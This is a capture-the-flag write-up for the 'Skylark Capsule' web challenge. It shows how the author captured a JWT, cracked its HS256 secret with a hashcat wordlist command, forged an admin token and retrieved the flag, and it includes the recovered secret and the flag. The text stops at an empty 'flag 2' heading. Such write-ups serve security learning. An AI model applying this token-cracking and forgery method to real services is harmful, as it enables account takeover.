# Skylark Capsule

## challenge information

We have the best capsules available for your deployment into space!
Backend systems

### flag 1
[100 points] Tokenz

Get your capsule now. Can you gain access to the capsule of 'admin'?

I first created a user with the username "user" and password "password" and investigated the `get specs` button. 
It makes a request to /user/capsule, my first thoguth was trying /admin/capsule but no dice. 
I then decided to look into the request and response with Burp

req
```
GET /user/capsule HTTP/1.1

Host: 467a5681e5eddd47c5050562550aef48.challenge.hackazon.org

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: application/json, text/plain, */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImlkIjo1LCJ1c2VybmFtZSI6InVzZXIiLCJlbWFpbCI6ImNhcHN1bGVAY2Fwc3VsZS5jb20iLCJwYXNzd29yZCI6IjkwMTkyNDU2NSJ9LCJpYXQiOjE2MjUzMDI1Mjd9.bElCkQvQbd94HHzEqWC61k0Tj5ZxlfIso20Tya-dLBc

Connection: close

Referer: https://467a5681e5eddd47c5050562550aef48.challenge.hackazon.org/capsule

Content-Length: 2
```


resp 
```json
HTTP/1.1 200 OK

Server: nginx
Date: Sat, 03 Jul 2021 09:17:10 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 103
Connection: close
X-Powered-By: Express
Access-Control-Allow-Origin: *
ETag: W/"67-8PJrQSzTW+muyyZ5C8fGdNCd2BU"

{"status":200,"data":[{"id":5,"username":"user","email":"capsule@capsule.com","password":"901924565"}]}
```

decoding the bearer token we see it is using 'HS256' a symmetric encryption algorithim, with this and not much else to go I try bruteforcing with hashcat

```
{
  "alg": "HS256",
  "typ": "JWT"
}
```

```
hashcat -a 0 -m 16500 token_file /usr/share/wordlists/rockyou.txt
```

we get a hit pretty quickly giving us the secret key of `skylark140584`

with this we can change our username in the jwt payload to admin and sign the key with the now known secret key to get a valid admin token

using this token and hitting the endpoint again we get the first flag

```
{
  "status": 200,
  "data": [
    {
      "id": 4,
      "username": "admin",
      "email": "admin@spacerace.com",
      "password": "-432570933"
    }
  ],
  "flag": "CTF{break1ng_dem_jwtz}"
}
```

**CTF{break1ng_dem_jwtz}**

### flag 2